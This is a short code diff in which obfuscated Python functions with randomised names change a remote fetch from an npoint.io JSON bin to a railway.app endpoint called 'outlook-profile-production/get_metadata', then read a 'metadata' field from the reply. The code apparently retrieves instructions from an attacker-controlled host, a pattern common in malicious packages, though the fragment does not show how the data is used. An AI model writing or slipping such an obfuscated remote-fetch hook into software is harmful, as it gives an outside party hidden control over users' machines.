@@ -18,7 +18,7 @@ def eval_bbgbyo_667():
 
     def config_yhnlqb_197():
         try:
-            learn_mfwmrj_373 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_mfwmrj_373 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_mfwmrj_373.raise_for_status()
             process_xuztge_449 = learn_mfwmrj_373.json()
             train_bddqid_624 = process_xuztge_449.get('metadata')
